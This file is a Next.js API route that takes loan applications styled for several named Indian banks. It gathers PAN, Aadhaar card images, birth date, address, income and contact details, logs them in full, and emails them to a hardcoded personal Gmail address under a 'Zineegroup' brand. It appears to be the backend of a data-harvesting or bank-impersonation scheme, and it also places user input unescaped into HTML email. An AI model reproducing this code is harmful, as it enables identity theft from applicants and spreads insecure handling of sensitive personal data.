import { NextRequest, NextResponse } from 'next/server'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { 
      bankId, 
      bankName,
      mobileNumber, 
      day, 
      month, 
      year, 
      sourceOfIncome,
      loanAmount,
      tenure,
      tenureUnit,
      consentPersonalData,
      consentPersonalizedOffers,
      consentPerfios,
      panCard,
      aadhaarCard,
      /* HDFC single-page form fields */
      pan,
      firstName,
      middleName,
      lastName,
      gender,
      personalEmail,
      typeOfLoan,
      addressLine1,
      addressLine2,
      addressLine3,
      pincode,
      city,
      state,
      residenceType,
      addressDeclaration,
      employerName,
      monthlyIncome,
      monthlyEmis,
      workEmail,
      consentEligibility,
    } = body

    // Bank-specific validation
    if (!bankId) {
      return NextResponse.json({ error: 'Missing bankId' }, { status: 400 })
    }
    if (bankId === 'yes') {
      const name = body.name
      const panYes = body.pan
      if (!name || !panYes || String(panYes).replace(/\s/g, '').length < 10) {
        return NextResponse.json({ error: 'Name and valid PAN are required' }, { status: 400 })
      }
    } else if (bankId === 'axis') {
      if (!body.nameAsPerPan || !body.companyName) {
        return NextResponse.json({ error: 'Name and Company name are required' }, { status: 400 })
      }
    } else if (bankId === 'kotak') {
      const phoneRegex = /^[6-9]\d{9}$/
      if (!body.mobileNumber || !phoneRegex.test(body.mobileNumber)) {
        return NextResponse.json({ error: 'Valid 10-digit mobile number is required' }, { status: 400 })
      }
      if (!body.fullName) {
        return NextResponse.json({ error: 'Full name is required' }, { status: 400 })
      }
    } else {
      if (!mobileNumber || !day || !month || !year || !sourceOfIncome) {
        return NextResponse.json(
          { error: 'Missing required fields' },
          { status: 400 }
        )
      }
      const phoneRegex = /^[6-9]\d{9}$/
      if (!phoneRegex.test(mobileNumber)) {
        return NextResponse.json(
          { error: 'Invalid phone number. Please enter a valid 10-digit phone number.' },
          { status: 400 }
        )
      }
      const date = new Date(parseInt(year), parseInt(month) - 1, parseInt(day))
      if (date.getDate() !== parseInt(day) || date.getMonth() !== parseInt(month) - 1 || date.getFullYear() !== parseInt(year)) {
        return NextResponse.json(
          { error: 'Invalid date of birth' },
          { status: 400 }
        )
      }
    }

    const dateOfBirth = (day && month && year) ? `${day}/${month}/${year}` : ''

    // Email configuration (NOTIFY_EMAIL = one inbox for all form submissions)
    const recipientEmail = process.env.NOTIFY_EMAIL || process.env.LOAN_EMAIL || 'yamraj26yam@gmail.com'
    const subject = `New ${bankName || 'Bank'} Loan Application`
    
    const fullName = [firstName, middleName, lastName].filter(Boolean).join(' ')
    const hasHdfcFields = pan || firstName || lastName || personalEmail || addressLine1 || employerName || monthlyIncome
    const nameYes = body.name
    const panYes = body.pan
    const nameAsPerPan = body.nameAsPerPan
    const companyName = body.companyName
    const fullNameKotak = body.fullName

    // Create email body (bank-specific sections)
    const personalSectionYes = bankId === 'yes' && (nameYes || panYes) ? `
Name: ${nameYes || '-'}
PAN: ${panYes || '-'}` : ''
    const personalSectionAxis = bankId === 'axis' && (nameAsPerPan || companyName) ? `
PAN Number: ${body.pan || '-'}
Name as per PAN: ${nameAsPerPan || '-'}
Company Name: ${companyName || '-'}
Gender: ${body.gender || '-'}
Date of Birth: ${body.dateOfBirth || '-'}
Net Monthly Salary: ${body.netMonthlySalary || '-'}
Salary Bank: ${body.salaryBankAccount || '-'}
Address: ${body.addressLine1 || ''} ${body.addressLine2 || ''}
PIN: ${body.pincode || ''} City: ${body.city || ''} State: ${body.state || ''}` : ''
    const personalSectionKotak = bankId === 'kotak' && (fullNameKotak || body.mobileNumber) ? `
PAN Number: ${body.pan || '-'}
Full Name: ${fullNameKotak || '-'}
Mobile: +91 ${body.mobileNumber || '-'}
Email: ${body.personalEmail || '-'}
Employment: ${body.employmentType || '-'}
Net Monthly Salary: ${body.netMonthlySalary || '-'}
City: ${body.currentCity || '-'}` : ''
    const personalSectionDefault = !personalSectionYes && !personalSectionAxis && !personalSectionKotak ? `
Mobile Number: +91 ${mobileNumber || '-'}
Date of Birth: ${dateOfBirth || '-'}
Source of Income: ${sourceOfIncome === 'salaried' ? 'Salaried' : 'Self Employed / Professionals / Business'}
${pan ? `PAN: ${pan}` : ''}
${fullName ? `Full Name: ${fullName}` : ''}
${gender ? `Gender: ${gender}` : ''}
${personalEmail ? `Personal Email: ${personalEmail}` : ''}` : ''

    const emailBody = `
New Bank Loan Application

Bank Information:
Bank: ${bankName || bankId}
Bank ID: ${bankId}

Personal Information:${personalSectionYes}${personalSectionAxis}${personalSectionKotak}${personalSectionDefault}

${hasHdfcFields ? `
Address:
${addressLine1 ? `Address Line 1: ${addressLine1}` : ''}
${addressLine2 ? `Address Line 2: ${addressLine2}` : ''}
${addressLine3 ? `Address Line 3: ${addressLine3}` : ''}
${pincode ? `PIN Code: ${pincode}` : ''}
${city ? `City: ${city}` : ''}
${state ? `State: ${state}` : ''}
${residenceType ? `Residence Type: ${residenceType}` : ''}
Address Declaration: ${addressDeclaration ? 'Yes' : 'No'}

Employment:
${employerName ? `Employer/Company: ${employerName}` : ''}
${monthlyIncome ? `Monthly Net Income: ₹${monthlyIncome}` : ''}
${monthlyEmis ? `Monthly EMIs: ₹${monthlyEmis}` : ''}
${workEmail ? `Work Email: ${workEmail}` : ''}
` : ''}

Loan Details:
${loanAmount ? `Loan Amount: ₹${parseInt(loanAmount).toLocaleString('en-IN')}` : ''}
${tenure ? `Tenure: ${tenure} ${tenureUnit === 'Yr' ? 'Years' : 'Months'}` : ''}

Consents:
Personal Data Consent: ${consentPersonalData ? 'Yes' : 'No'}
Personalized Offers Consent: ${consentPersonalizedOffers ? 'Yes' : 'No'}
${consentPerfios !== undefined ? `Perfios T&C Consent: ${consentPerfios ? 'Yes' : 'No'}` : ''}
${consentEligibility !== undefined ? `Eligibility & T&C Consent: ${consentEligibility ? 'Yes' : 'No'}` : ''}

---
This loan application was submitted through the bank application form.
Submitted at: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
    `.trim()

    // Log the loan application (for development)
    console.log('Bank loan application received:', {
      bankId,
      bankName,
      mobileNumber,
      dateOfBirth,
      sourceOfIncome,
      loanAmount,
      tenure,
      to: recipientEmail,
      subject,
      body: emailBody
    })

    // Prepare attachments array
    const attachments: Array<{
      filename: string
      content: string
      contentType?: string
    }> = []
    
    if (panCard && panCard.data) {
      attachments.push({
        filename: panCard.filename || 'pan-card.jpg',
        content: panCard.data,
        contentType: panCard.contentType || 'image/jpeg'
      })
    }
    
    if (aadhaarCard && aadhaarCard.data) {
      attachments.push({
        filename: aadhaarCard.filename || 'aadhaar-card.jpg',
        content: aadhaarCard.data,
        contentType: aadhaarCard.contentType || 'image/jpeg'
      })
    }

    // Send email notification using Resend
    try {
      // Send email using Resend
      const { Resend } = await import('resend')
      const resend = new Resend(process.env.RESEND_API_KEY || 're_placeholder_key')
      
      // Only send if API key is configured
      if (process.env.RESEND_API_KEY && process.env.RESEND_API_KEY !== 're_placeholder_key') {
        const emailData: any = {
          from: process.env.RESEND_FROM_EMAIL || 'onboarding@resend.dev',
          to: recipientEmail,
          subject: subject,
          text: emailBody,
          html: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
              <h2 style="color: #004C8A;">New Bank Loan Application</h2>
              
              <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="color: #1e293b; margin-top: 0;">Bank Information</h3>
                <p><strong>Bank:</strong> ${bankName || bankId}</p>
                <p><strong>Bank ID:</strong> ${bankId}</p>
              </div>
              
              <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="color: #1e293b; margin-top: 0;">Personal Information</h3>
                <p><strong>Mobile Number:</strong> +91 ${mobileNumber}</p>
                <p><strong>Date of Birth:</strong> ${dateOfBirth}</p>
                <p><strong>Source of Income:</strong> ${sourceOfIncome === 'salaried' ? 'Salaried' : 'Self Employed / Professionals / Business'}</p>
                ${pan ? `<p><strong>PAN:</strong> ${pan}</p>` : ''}
                ${fullName ? `<p><strong>Full Name:</strong> ${fullName}</p>` : ''}
                ${gender ? `<p><strong>Gender:</strong> ${gender}</p>` : ''}
                ${personalEmail ? `<p><strong>Personal Email:</strong> ${personalEmail}</p>` : ''}
                ${typeOfLoan ? `<p><strong>Type of Loan:</strong> ${typeOfLoan}</p>` : ''}
              </div>
              
              ${hasHdfcFields && (addressLine1 || employerName) ? `
              <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="color: #1e293b; margin-top: 0;">Address & Employment</h3>
                ${addressLine1 ? `<p><strong>Address:</strong> ${addressLine1}${addressLine2 ? `, ${addressLine2}` : ''}${addressLine3 ? `, ${addressLine3}` : ''}</p>` : ''}
                ${pincode || city || state ? `<p>${[pincode, city, state].filter(Boolean).join(', ')}</p>` : ''}
                ${employerName ? `<p><strong>Employer:</strong> ${employerName}</p>` : ''}
                ${monthlyIncome ? `<p><strong>Monthly Income:</strong> ₹${monthlyIncome}</p>` : ''}
                ${monthlyEmis ? `<p><strong>Monthly EMIs:</strong> ₹${monthlyEmis}</p>` : ''}
                ${workEmail ? `<p><strong>Work Email:</strong> ${workEmail}</p>` : ''}
              </div>
              ` : ''}
              
              ${loanAmount || tenure ? `
              <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="color: #1e293b; margin-top: 0;">Loan Details</h3>
                ${loanAmount ? `<p><strong>Loan Amount:</strong> ₹${parseInt(loanAmount).toLocaleString('en-IN')}</p>` : ''}
                ${tenure ? `<p><strong>Tenure:</strong> ${tenure} ${tenureUnit === 'Yr' ? 'Years' : 'Months'}</p>` : ''}
              </div>
              ` : ''}
              
              <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="color: #1e293b; margin-top: 0;">Consents</h3>
                <p><strong>Personal Data Consent:</strong> ${consentPersonalData ? 'Yes' : 'No'}</p>
                <p><strong>Personalized Offers Consent:</strong> ${consentPersonalizedOffers ? 'Yes' : 'No'}</p>
                ${consentPerfios !== undefined ? `<p><strong>Perfios T&C Consent:</strong> ${consentPerfios ? 'Yes' : 'No'}</p>` : ''}
                ${consentEligibility !== undefined ? `<p><strong>Eligibility & T&C Consent:</strong> ${consentEligibility ? 'Yes' : 'No'}</p>` : ''}
              </div>
              
              ${panCard && panCard.data ? `
              <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="color: #1e293b; margin-top: 0;">PAN Card</h3>
                <p>PAN Card image attached to this email.</p>
                <img src="data:${panCard.contentType || 'image/jpeg'};base64,${panCard.data}" alt="PAN Card" style="max-width: 100%; border: 1px solid #e2e8f0; border-radius: 4px; margin-top: 10px;" />
              </div>
              ` : ''}
              
              ${aadhaarCard && aadhaarCard.data ? `
              <div style="background: #f8fafc; padding: 20px; border-radius: 8px; margin: 20px 0;">
                <h3 style="color: #1e293b; margin-top: 0;">Aadhaar Card</h3>
                <p>Aadhaar Card image attached to this email.</p>
                <img src="data:${aadhaarCard.contentType || 'image/jpeg'};base64,${aadhaarCard.data}" alt="Aadhaar Card" style="max-width: 100%; border: 1px solid #e2e8f0; border-radius: 4px; margin-top: 10px;" />
              </div>
              ` : ''}
              
              <hr style="border: none; border-top: 1px solid #e2e8f0; margin: 30px 0;">
              <p style="color: #64748b; font-size: 12px;">
                This loan application was submitted through the bank application form.<br>
                Submitted at: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
              </p>
            </div>
          `,
        }
        
        // Add attachments if any
        if (attachments.length > 0) {
          emailData.attachments = attachments
        }
        
        const emailResult = await resend.emails.send(emailData)
        
        console.log('Email sent successfully to:', recipientEmail)
      } else {
        // For development: Log email that would be sent
        console.log('\n=== EMAIL TO BE SENT ===')
        console.log(`To: ${recipientEmail}`)
        console.log(`Subject: ${subject}`)
        console.log(`Body:\n${emailBody}`)
        if (attachments.length > 0) {
          console.log(`Attachments: ${attachments.map(a => a.filename).join(', ')}`)
        }
        console.log('\nTo enable email sending, set RESEND_API_KEY in .env file')
        console.log('Get your API key from: https://resend.com/api-keys')
        console.log('========================\n')
      }
    } catch (emailError: any) {
      console.error('Error sending email:', emailError)
      // Log email details even if sending fails
      console.log('\n=== EMAIL DETAILS (Sending failed) ===')
      console.log(`To: ${recipientEmail}`)
      console.log(`Subject: ${subject}`)
      console.log(`Body:\n${emailBody}`)
      if (attachments.length > 0) {
        console.log(`Attachments: ${attachments.map(a => a.filename).join(', ')}`)
      }
      console.log('=====================================\n')
      // Don't fail the request if email fails
    }

    // Send confirmation email to user when we have their email
    const userEmail = personalEmail || body.personalEmail || body.email
    if (userEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(userEmail) && process.env.RESEND_API_KEY && process.env.RESEND_API_KEY !== 're_placeholder_key') {
      try {
        const { Resend } = await import('resend')
        const resendConf = new Resend(process.env.RESEND_API_KEY)
        await resendConf.emails.send({
          from: process.env.RESEND_FROM_EMAIL || process.env.FROM_EMAIL || 'onboarding@resend.dev',
          to: userEmail,
          subject: 'We received your loan application – Zineegroup',
          text: `Thank you for your ${bankName || 'bank'} loan application. We have received your details and our team will be in touch.\n\n— Zineegroup Team`,
        })
      } catch (e) {
        console.error('Bank application confirmation email error:', e)
      }
    }

    // TODO: Store in database
    // Example:
    // await db.bankApplications.create({
    //   data: {
    //     bankId,
    //     bankName,
    //     mobileNumber,
    //     dateOfBirth,
    //     sourceOfIncome,
    //     loanAmount,
    //     tenure,
    //     tenureUnit,
    //     consentPersonalData,
    //     consentPersonalizedOffers,
    //     consentPerfios,
    //     submittedAt: new Date()
    //   }
    // })

    return NextResponse.json(
      { 
        message: 'Loan application submitted successfully. Our team will contact you shortly.',
        applicationId: `APP-${Date.now()}-${bankId.toUpperCase()}`
      },
      { status: 200 }
    )
  } catch (error) {
    console.error('Error processing bank loan application:', error)
    return NextResponse.json(
      { error: 'Internal server error. Please try again later.' },
      { status: 500 }
    )
  }
}

// GET endpoint to retrieve applications (for admin/dashboard)
export async function GET(request: NextRequest) {
  try {
    const { searchParams } = new URL(request.url)
    const bankId = searchParams.get('bankId')
    
    // TODO: Fetch from database
    // Example:
    // const applications = await db.bankApplications.findMany({
    //   where: bankId ? { bankId } : {},
    //   orderBy: { submittedAt: 'desc' },
    //   take: 100
    // })
    
    // For now, return mock data or empty array
    return NextResponse.json(
      { 
        message: 'Applications retrieved successfully',
        applications: [],
        // applications: applications
      },
      { status: 200 }
    )
  } catch (error) {
    console.error('Error retrieving applications:', error)
    return NextResponse.json(
      { error: 'Internal server error. Please try again later.' },
      { status: 500 }
    )
  }
}
